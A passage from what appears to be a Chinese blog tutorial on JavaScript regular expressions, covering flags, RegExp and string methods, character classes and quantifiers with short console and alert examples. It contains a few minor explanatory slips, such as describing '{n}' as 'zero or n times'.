<h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> expression = <span class="regexp">/ pattern /</span> flags;</span><br><span class="line"><span class="keyword">var</span> expression = <span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">&quot; patterns &quot;</span> , <span class="string">&quot; flags &quot;</span>);</span><br><span class="line"><span class="comment">//patterns为pattern中每个元字符前加一个\组成或者由字符串加变量组成</span></span><br></pre></td></tr></table></figure>

<ul>
<li>expression：正则表达式的名称</li>
<li>pattern：正则表达式的模式</li>
<li>flags：标志，包括<ul>
<li>g:global,应用于所有字符串，而非在发现第一个匹配项时立即停止</li>
<li>i:case-insesitive,忽略大小写</li>
<li>m:multiline,多行检测</li>
<li>u:Unicode,用来正确处理大于\uFFFFd Unicode 字符<br>注意：点（.）字符在正则表达式中，含义是除了换行符以外的任意单个字符。对于码位大于 0xFFFF 的 Unicode 字符，点字符不能识别，必须加上 u 修饰符</li>
<li>y:sticky,y 修饰符的作用与 g 修饰符类似，也是全局匹配，后一次匹配都从上一次匹配成功的下一个位置开始。不同之处在于，g 修饰符只要剩余位置中存在匹配就可，而 y 修饰符确保匹配必须从剩余的第一个位置开始，这也就是“粘连”的涵义。</li>
</ul>
</li>
</ul>
<h3 id="实例属性"><a href="#实例属性" class="headerlink" title="实例属性"></a>实例属性</h3><table>
<thead>
<tr>
<th>属性</th>
<th>数据类型</th>
<th>意义</th>
</tr>
</thead>
<tbody><tr>
<td>global</td>
<td>boolean</td>
<td>是否有 g 标志</td>
</tr>
<tr>
<td>ignoreCase</td>
<td>boolean</td>
<td>是否有 i 标志</td>
</tr>
<tr>
<td>multiline</td>
<td>boolean</td>
<td>是否有 m 标志</td>
</tr>
<tr>
<td>lastIndex</td>
<td>int</td>
<td>从第几个字符开始匹配</td>
</tr>
<tr>
<td>source</td>
<td>str</td>
<td>正则表达式的字符串表示</td>
</tr>
<tr>
<td>flags</td>
<td>str</td>
<td>正则表达式的修饰符</td>
</tr>
<tr>
<td>sticky</td>
<td>boolean</td>
<td>是否有 y 标签</td>
</tr>
</tbody></table>
<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="RegExp-实例方法"><a href="#RegExp-实例方法" class="headerlink" title="RegExp 实例方法"></a>RegExp 实例方法</h3><h4 id="regObj-test-strObj"><a href="#regObj-test-strObj" class="headerlink" title="regObj.test(strObj)*"></a>regObj.test(strObj)*</h4><p>用于测试字符串中是否存在符合正则表达式模式的部分，如果<strong>存在则返回 true，否则返回 false</strong>。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> test = (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> <span class="title class_">PhoneNumber</span> = <span class="regexp">/^\d&#123;11&#125;$/</span>;</span><br><span class="line">  <span class="keyword">var</span> number1 = <span class="string">&quot;17802015408&quot;</span>;</span><br><span class="line">  <span class="keyword">var</span> number2 = <span class="string">&quot;1530775669&quot;</span>;</span><br><span class="line">  <span class="keyword">var</span> number3 = <span class="string">&quot;178020154080&quot;</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;number1 is a &quot;</span> + <span class="title class_">PhoneNumber</span>.<span class="title function_">test</span>(number1) + <span class="string">&quot; phone number.&quot;</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;number2 is a &quot;</span> + <span class="title class_">PhoneNumber</span>.<span class="title function_">test</span>(number2) + <span class="string">&quot; phone number.&quot;</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;number3 is a &quot;</span> + <span class="title class_">PhoneNumber</span>.<span class="title function_">test</span>(number3) + <span class="string">&quot; phone number.&quot;</span>);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<h4 id="regObj-exec-strObj"><a href="#regObj-exec-strObj" class="headerlink" title="regObj.exec(strObj)"></a>regObj.exec(strObj)</h4><p>方法用于正则表达式模式在字符串中运行查找，如果 exec() 找到了匹配的文本，则返回一个结果<strong>数组</strong>。否则，返回 <strong>null</strong>。除了数组元素和 length 属性之外，exec() 方法还返回两个属性。<strong>index 属性</strong>声明的是匹配文本的第一个字符的位置。<strong>input 属性</strong>则存放的是被检索的字符串 string。<br>调用非全局的 RegExp 对象的 exec() 时，返回数组的第 0 个元素是与正则表达式相匹配的文本，第 1 个元素是与 RegExpObject 的第 1 个分组相匹配的文本（如果有的话），第 2 个元素是与 RegExp 对象的第 2 个分组相匹配的文本（如果有的话），以此类推。<br>调用全局的 RegExp 对象的 exec() 时，它会在 RegExp 实例的 lastIndex 属性指定的字符处开始检索字符串 string。当 exec() 找到了与表达式相匹配的文本时，在匹配后，它将把 RegExp 实例的 lastIndex 属性设置为匹配文本的最后一个字符的下一个位置。可以通过反复调用 exec() 方法来遍历字符串中的所有匹配文本。当 exec() 再也找不到匹配的文本时，它将返回 null，并把 lastIndex 属性重置为 0。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//无g标志</span></span><br><span class="line"><span class="keyword">var</span> execs = (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> text = <span class="string">&quot;abababab&quot;</span>;</span><br><span class="line">  <span class="keyword">var</span> pattern = <span class="regexp">/ab(ab)/</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(pattern.<span class="title function_">exec</span>(text));</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(pattern.<span class="property">lastIndex</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(pattern.<span class="title function_">exec</span>(text));</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(pattern.<span class="property">lastIndex</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(pattern.<span class="title function_">exec</span>(text));</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(pattern.<span class="property">lastIndex</span>);</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="comment">//有g标志</span></span><br><span class="line"><span class="keyword">var</span> execg = (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> text = <span class="string">&quot;AbAbBCAb&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> pattern = <span class="regexp">/Ab|BC/g</span>;</span><br><span class="line">  <span class="comment">//pattern.lastIndex = 1;    //改变lastIndex属性</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(pattern.<span class="property">lastIndex</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(pattern.<span class="title function_">exec</span>(text));</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(pattern.<span class="property">lastIndex</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(pattern.<span class="title function_">exec</span>(text));</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(pattern.<span class="property">lastIndex</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(pattern.<span class="title function_">exec</span>(text));</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(pattern.<span class="property">lastIndex</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(pattern.<span class="title function_">exec</span>(text));</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(pattern.<span class="property">lastIndex</span>);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<h3 id="字符串方法"><a href="#字符串方法" class="headerlink" title="字符串方法"></a>字符串方法</h3><h4 id="strObj-search-RegObj"><a href="#strObj-search-RegObj" class="headerlink" title="strObj.search(RegObj)"></a>strObj.search(RegObj)</h4><p>search() 方法用于检索字符串中指定的子字符串，或检索与正则表达式相匹配的子字符串。search() 方法不执行全局匹配，它将忽略标志 g。它同时忽略 regexp 的 lastIndex 属性，并且总是从字符串的开始进行检索，这意味着它总是返回 stringObject 的第一个匹配的位置。没有匹配则返回-1。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> search = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"> <span class="keyword">var</span> text = <span class="string">&quot;asdfasAAAAAA&quot;</span>;</span><br><span class="line"> <span class="keyword">var</span> pattern = <span class="regexp">/AA/g</span>;</span><br><span class="line"> <span class="keyword">var</span> te = <span class="string">&quot;AA&quot;</span></span><br><span class="line"> <span class="variable language_">console</span>.<span class="title function_">log</span>(text.<span class="title function_">search</span>(pattern));</span><br><span class="line"> <span class="variable language_">console</span>.<span class="title function_">log</span>(text.<span class="title function_">indexOf</span>(te));</span><br><span class="line"> <span class="keyword">var</span> example = <span class="string">&quot;adfasd9ad1s1f&quot;</span>;</span><br><span class="line"> <span class="keyword">var</span> pattern2 = <span class="regexp">/\d/g</span>;</span><br><span class="line"> <span class="variable language_">console</span>.<span class="title function_">log</span>(example.<span class="title function_">charAt</span>(example.<span class="title function_">search</span>(pattern2)))；</span><br><span class="line">&#125;()</span><br></pre></td></tr></table></figure>

<h4 id="strObj-match-RegObj"><a href="#strObj-match-RegObj" class="headerlink" title="strObj.match(RegObj)*"></a>strObj.match(RegObj)*</h4><p>字符串对象的 match 方法与正则对象的 exec 方法比较类似，但是如果正则表达式带有 g 修饰符，那么 match 方法就可以以数组的方式返回所有成功匹配的结果，但是 exec 方法只返回了一个。如果不带 g，则是返回其分组结果。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> match = (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> text = <span class="string">&quot;asdfasdasdfasdfadsf&quot;</span>;</span><br><span class="line">  <span class="keyword">var</span> pattern = <span class="regexp">/a(sd)/g</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(text.<span class="title function_">match</span>(pattern));</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<h4 id="strObj-replace-regObj-replaceStr-function"><a href="#strObj-replace-regObj-replaceStr-function" class="headerlink" title="strObj.replace(regObj,replaceStr|function(){})*"></a>strObj.replace(regObj,replaceStr|function(){})*</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stringObject.<span class="title function_">replace</span>(regexp / substr, replacement);</span><br></pre></td></tr></table></figure>

<p>字符串 stringObject 的 replace() 方法执行的是查找并替换的操作。它将在 stringObject 中查找与 regexp 相匹配的子字符串，然后用 replacement 来替换这些子串。如果 regexp 具有全局标志 g，那么 replace() 方法将替换所有匹配的子串。否则，它只替换第一个匹配子串。<br>replacement 可以是字符串，也可以是函数。如果它是字符串，那么每个匹配都将由字符串替换。但是 replacement 中的 $ 字符具有特定的含义。如下表所示，它说明从模式匹配得到的字符串将用于替换。</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>替换文本</th>
</tr>
</thead>
<tbody><tr>
<td>$1、$2、…、$99</td>
<td>与 regexp 中的第 1 到第 99 个子表达式相匹配的文本。</td>
</tr>
<tr>
<td>$&amp;</td>
<td>与 regexp 相匹配的子串。</td>
</tr>
<tr>
<td>$`</td>
<td>位于匹配子串左侧的文本。</td>
</tr>
<tr>
<td>$’</td>
<td>位于匹配子串右侧的文本。</td>
</tr>
<tr>
<td>$$</td>
<td>直接量符号。</td>
</tr>
</tbody></table>
<p><strong>注意</strong>：ECMAScript v3 规定，replace() 方法的参数 replacement 可以是函数而不是字符串。在这种情况下，每个匹配都调用该函数，它返回的字符串将作为替换文本使用。该函数的第一个参数是匹配模式的字符串。接下来的参数是与模式中的子表达式匹配的字符串，可以有 0 个或多个这样的参数。接下来的参数是一个整数，声明了匹配在 stringObject 中出现的位置。最后一个参数是 stringObject 本身。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//不使用正则</span></span><br><span class="line"><span class="keyword">var</span> replace = (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> text = <span class="string">&quot;1&lt;%2%&gt;34&lt;%567%&gt;89&quot;</span>;</span><br><span class="line">  text = text.<span class="title function_">replace</span>(<span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;@&quot;</span>);</span><br><span class="line">  text = text.<span class="title function_">replace</span>(<span class="string">&quot;%&quot;</span>, <span class="string">&quot;#&quot;</span>);</span><br><span class="line">  text = text.<span class="title function_">replace</span>(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;@&quot;</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(text);</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="comment">//使用正则</span></span><br><span class="line"><span class="keyword">var</span> replace = (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> text = <span class="string">&quot;1&lt;%2%&gt;34&lt;%567%&gt;89&quot;</span>;</span><br><span class="line">  text = text.<span class="title function_">replace</span>(<span class="regexp">/&lt;%(\d+)%&gt;/g</span>, <span class="string">&quot;@#$1#@&quot;</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(text);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<h4 id="strObj-split-regObj"><a href="#strObj-split-regObj" class="headerlink" title="strObj.split(regObj)"></a>strObj.split(regObj)</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stringObject.<span class="title function_">split</span>(separator, howmany);</span><br></pre></td></tr></table></figure>

<p>一个字符串数组。该数组是通过在 separator 指定的边界处将字符串 stringObject 分割成子串创建的。返回的数组中的字串不包括 separator 自身。<br>但是，如果 separator 是包含子表达式的正则表达式，那么返回的数组中包括与这些子表达式匹配的字串（但不包括与整个正则表达式匹配的文本）。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> split = (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  text = <span class="string">&quot;a1b2c3d&quot;</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(text.<span class="title function_">split</span>(<span class="regexp">/\d/</span>));</span><br><span class="line">  name = <span class="string">&quot;asfasdf,fadf./asdf.asdf[asdf&quot;</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(name.<span class="title function_">split</span>(<span class="regexp">/\W/</span>));</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><h3 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">( [ &#123; \ ^ $ | ) ? * + .</span><br></pre></td></tr></table></figure>

<h3 id="预定义的特殊字符"><a href="#预定义的特殊字符" class="headerlink" title="预定义的特殊字符"></a>预定义的特殊字符</h3><table>
<thead>
<tr>
<th>字符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>\t</td>
<td>制表符</td>
</tr>
<tr>
<td>\n</td>
<td>换行符</td>
</tr>
<tr>
<td>\r</td>
<td>回车符</td>
</tr>
<tr>
<td>\f</td>
<td>换页符</td>
</tr>
<tr>
<td>\a</td>
<td>alert 字符</td>
</tr>
<tr>
<td>\e</td>
<td>escape 字符</td>
</tr>
<tr>
<td>\cX /</td>
<td>与 X 相对应的控制字符</td>
</tr>
<tr>
<td>\b</td>
<td>与回退字符</td>
</tr>
<tr>
<td>\v</td>
<td>垂直制表符</td>
</tr>
<tr>
<td>\0</td>
<td>空字符</td>
</tr>
</tbody></table>
<h3 id="分枝条件"><a href="#分枝条件" class="headerlink" title="分枝条件"></a>分枝条件</h3><p>继续在分组上做文章。在分组中插入管道符（“|”），把它划分为两个或多个候多项。是懒惰的，假如不带 g，匹配前面成功不会尝试后面。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/(red|black|yellow)!!/</span>;</span><br><span class="line"><span class="title function_">alert</span>(reg.<span class="title function_">test</span>(<span class="string">&quot;red!!&quot;</span>)); <span class="comment">//true</span></span><br><span class="line"><span class="title function_">alert</span>(reg.<span class="title function_">test</span>(<span class="string">&quot;black!!&quot;</span>)); <span class="comment">//true</span></span><br><span class="line"><span class="title function_">alert</span>(reg.<span class="title function_">test</span>(<span class="string">&quot;yellow!!&quot;</span>)); <span class="comment">//true</span></span><br></pre></td></tr></table></figure>

<h3 id="边界"><a href="#边界" class="headerlink" title="边界"></a>边界</h3><p>一个要与字符类合用的东西。 <strong>不占位</strong></p>
<table>
<thead>
<tr>
<th>正则</th>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>^</td>
<td>开头</td>
<td>注意不能紧跟于左中括号的后面</td>
</tr>
<tr>
<td>$</td>
<td>结尾</td>
<td></td>
</tr>
<tr>
<td>\b</td>
<td>单词边界</td>
<td>指[a-zA-Z_0-9]之外的字符</td>
</tr>
<tr>
<td>\B</td>
<td>非单词边界</td>
<td></td>
</tr>
</tbody></table>
<p>单词边界举例。要匹配的东西的前端或未端不能为英文字母阿拉伯字数字或下横线。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">&quot;12w-eefd&amp;efrew&quot;</span>;</span><br><span class="line"><span class="title function_">alert</span>(str.<span class="title function_">match</span>(<span class="regexp">/\b\w+\b/g</span>)); <span class="comment">//12w,eefd,efrew</span></span><br></pre></td></tr></table></figure>

<h3 id="字符类"><a href="#字符类" class="headerlink" title="字符类"></a>字符类</h3><h4 id="简单类"><a href="#简单类" class="headerlink" title="简单类"></a>简单类</h4><p>原则上正则的一个字符对应一个字符，我们可以用[]把它们括起来，让[]这个整体对应一个字符。如</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">alert</span>(<span class="regexp">/abc/</span>.<span class="title function_">test</span>(<span class="string">&quot;abc&quot;</span>)); <span class="comment">//true</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="regexp">/[abc]/</span>.<span class="title function_">test</span>(<span class="string">&quot;a&quot;</span>)); <span class="comment">//true</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="regexp">/[abc]/</span>.<span class="title function_">test</span>(<span class="string">&quot;b&quot;</span>)); <span class="comment">//true</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="regexp">/[abc]/</span>.<span class="title function_">test</span>(<span class="string">&quot;c&quot;</span>)); <span class="comment">//true</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&quot;a bat ,a Cat,a fAt bat ,a faT cat&quot;</span>.<span class="title function_">match</span>(<span class="regexp">/[bcf]at/gi</span>)); <span class="comment">//bat,Cat,fAt,bat,faT,cat</span></span><br></pre></td></tr></table></figure>

<h4 id="负向类"><a href="#负向类" class="headerlink" title="负向类"></a>负向类</h4><p>在[]前面加个元字符^进行取反，表示匹配不能为括号里面的字符。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">alert</span>(<span class="regexp">/[^abc]/</span>.<span class="title function_">test</span>(<span class="string">&quot;a&quot;</span>)); <span class="comment">//false</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="regexp">/[^abc]/</span>.<span class="title function_">test</span>(<span class="string">&quot;b&quot;</span>)); <span class="comment">//false</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="regexp">/[^abc]/</span>.<span class="title function_">test</span>(<span class="string">&quot;6&quot;</span>)); <span class="comment">//true</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="regexp">/[^abc]/</span>.<span class="title function_">test</span>(<span class="string">&quot;gg&quot;</span>)); <span class="comment">//true</span></span><br></pre></td></tr></table></figure>

<h4 id="范围类"><a href="#范围类" class="headerlink" title="范围类"></a>范围类</h4><p>还是在那个中括号里面做文章。有时匹配的东西过多，而且类型又相同，全部输入太麻烦，我们可以用它。特征就是在中间加了个横线。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">alert</span>(<span class="regexp">/[a-f]/</span>.<span class="title function_">test</span>(<span class="string">&quot;b&quot;</span>)); <span class="comment">//true</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="regexp">/[a-f]/</span>.<span class="title function_">test</span>(<span class="string">&quot;g&quot;</span>)); <span class="comment">//false</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="regexp">/[a-z]/</span>.<span class="title function_">test</span>(<span class="string">&quot;h&quot;</span>)); <span class="comment">//true</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="regexp">/[0-9]/</span>.<span class="title function_">test</span>(<span class="string">&quot;8&quot;</span>)); <span class="comment">//true</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="regexp">/[0-9]/</span>.<span class="title function_">test</span>(<span class="string">&quot;a&quot;</span>)); <span class="comment">//false</span></span><br></pre></td></tr></table></figure>

<h4 id="组合类"><a href="#组合类" class="headerlink" title="组合类"></a>组合类</h4><p>中括号内可以组合使用不同类型的单个字符。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">alert</span>(<span class="regexp">/[^H-Y]/</span>.<span class="title function_">test</span>(<span class="string">&quot;G&quot;</span>)); <span class="comment">//true</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="regexp">/[^7-9]/</span>.<span class="title function_">test</span>(<span class="string">&quot;6&quot;</span>)); <span class="comment">//true</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="regexp">/[a-m1-5\n]/</span>.<span class="title function_">test</span>(<span class="string">&quot;a&quot;</span>)); <span class="comment">//true</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="regexp">/[a-m1-5\n]/</span>.<span class="title function_">test</span>(<span class="string">&quot;3&quot;</span>)); <span class="comment">//true</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="regexp">/[a-m1-5\n]/</span>.<span class="title function_">test</span>(<span class="string">&quot;\n&quot;</span>)); <span class="comment">//true</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="regexp">/[a-m1-5\n]/</span>.<span class="title function_">test</span>(<span class="string">&quot;r&quot;</span>)); <span class="comment">//false</span></span><br></pre></td></tr></table></figure>

<h4 id="预定义类"><a href="#预定义类" class="headerlink" title="预定义类"></a>预定义类</h4><p>使用反义字符代替某些常用的组合集</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>等同于</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>.</td>
<td>[^\n\r]</td>
<td>除了换行和回车之外的任意字符</td>
</tr>
<tr>
<td>\d</td>
<td>[0-9]</td>
<td>数字字符</td>
</tr>
<tr>
<td>\D</td>
<td>[^0-9]</td>
<td>非数字字符</td>
</tr>
<tr>
<td>\s</td>
<td>[ \t\n\x0B\f\r]</td>
<td>空白字符</td>
</tr>
<tr>
<td>\S</td>
<td>[^ \t\n\x0B\f\r]</td>
<td>非空白字符</td>
</tr>
<tr>
<td>\w</td>
<td>[a-zA-Z_0-9]</td>
<td>单词字符(所有的字母)</td>
</tr>
<tr>
<td>\W</td>
<td>[^a-za-z_0-9]</td>
<td>非单词字符</td>
</tr>
</tbody></table>
<h4 id="量词（限定符）"><a href="#量词（限定符）" class="headerlink" title="量词（限定符）"></a>量词（限定符）</h4><table>
<thead>
<tr>
<th>代码</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>?</td>
<td>出现零次或一次</td>
</tr>
<tr>
<td>*</td>
<td>出现零次或多次(任意次)</td>
</tr>
<tr>
<td>+</td>
<td>出现一次或多次（至少一次）</td>
</tr>
<tr>
<td>{n}</td>
<td>对应零次或者 n 次</td>
</tr>
<tr>
<td>{n,m}</td>
<td>至少出现 n 次但不超过 m 次</td>
</tr>
<tr>
<td>{n,}</td>
<td>至少出现 n 次(+的升级版)</td>
</tr>
</tbody></table>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">alert</span>(<span class="regexp">/...../</span>.<span class="title function_">test</span>(<span class="string">&quot;正则表达式&quot;</span>)); <span class="comment">//true</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="regexp">/正则表达式/</span>.<span class="title function_">test</span>(<span class="string">&quot;正则表达式&quot;</span>)); <span class="comment">//true</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">alert</span>(<span class="regexp">/[\u4e00-\u9fa5]&#123;5&#125;/</span>.<span class="title function_">test</span>(<span class="string">&quot;正则表达式&quot;</span>)); <span class="comment">//true</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="regexp">/[\u4e00-\u9fa5]&#123;4&#125;/</span>.<span class="title function_">test</span>(<span class="string">&quot;正则表达式55&quot;</span>)); <span class="comment">//true</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="regexp">/^[\u4e00-\u9fa5]+$/</span>.<span class="title function_">test</span>(<span class="string">&quot;正则表达式&quot;</span>)); <span class="comment">//true</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="regexp">/^[\u4e00-\u9fa5]+$/</span>.<span class="title function_">test</span>(<span class="string">&quot;正则表达式#&quot;</span>)); <span class="comment">//false</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="regexp">/\d&#123;6&#125;/</span>.<span class="title function_">test</span>(<span class="string">&quot;123456&quot;</span>)); <span class="comment">//true</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="regexp">/[regx]&#123;2&#125;/</span>.<span class="title function_">test</span>(<span class="string">&quot;ee&quot;</span>)); <span class="comment">//true</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="regexp">/[regx]&#123;2&#125;/</span>.<span class="title function_">test</span>(<span class="string">&quot;ex&quot;</span>)); <span class="comment">//true</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="regexp">/[regx]&#123;2&#125;/</span>.<span class="title function_">test</span>(<span class="string">&quot;xx&quot;</span>)); <span class="comment">//true</span></span><br></pre></td></tr></table></figure>

<h4 id="贪婪量词，懒惰量词与独占-支配性量词"><a href="#贪婪量词，懒惰量词与独占-支配性量词" class="headerlink" title="贪婪量词，懒惰量词与独占/支配性量词"></a>贪婪量词，懒惰量词与独占/支配性量词</h4><p>贪婪量词: 当正则表达式中包含能接受重复量词时，默认的行为是（在使整个表达式能得到匹配的前提下）匹配尽可能多的字符。</p>
